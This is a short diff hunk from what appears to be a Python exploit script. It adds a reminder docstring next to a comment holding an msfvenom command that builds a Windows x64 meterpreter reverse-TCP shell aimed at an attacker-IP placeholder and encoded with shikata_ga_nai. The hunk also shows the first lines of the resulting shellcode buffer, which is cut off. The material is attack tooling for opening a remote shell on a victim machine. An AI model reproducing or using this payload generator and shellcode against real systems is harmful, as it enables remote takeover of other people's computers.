@@ -12,6 +12,9 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
     # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[ATTACKER_PORT] EXITFUNC=thread -f python -b '\x00' –e x86/shikata_ga_nai
+    """
+    DONT FORGET TO TRY THIS WITH A NON-METERPRETER PAYLOAD !!!
+    """
     buf =  ""
     buf += "\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05"
     buf += "\xef\xff\xff\xff\x48\xbb\x80\x7a\x63\x21\x82\x81\x36"
